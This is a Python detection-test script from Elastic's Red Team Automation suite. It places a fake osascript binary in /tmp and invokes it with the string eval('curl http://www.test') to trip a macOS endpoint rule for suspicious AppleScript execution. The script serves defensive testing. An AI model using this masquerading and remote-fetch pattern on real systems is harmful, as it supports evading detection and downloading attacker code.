# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="af8d27bb-1673-463f-8631-a5b30278cf33",
    platforms=["macos"],
    endpoint=[{"rule_name": "Suspicious Apple Script Execution", "rule_id": "7b9d544a-5b2a-4f0d-984a-cdc89a7fad25"}],
    siem=[],
    techniques=["T1105", "T1059"],
)


@common.requires_os(metadata.platforms)
def main():

    masquerade = "/tmp/osascript"
    common.create_macos_masquerade(masquerade)

    # Execute command
    common.log("Launching fake osascript and javascript commands")
    common.execute(
        [masquerade, "JavaScript", "eval('curl http://www.test')"],
        timeout=10,
        kill=True,
    )

    # cleanup
    common.remove_file(masquerade)


if __name__ == "__main__":
    exit(main())
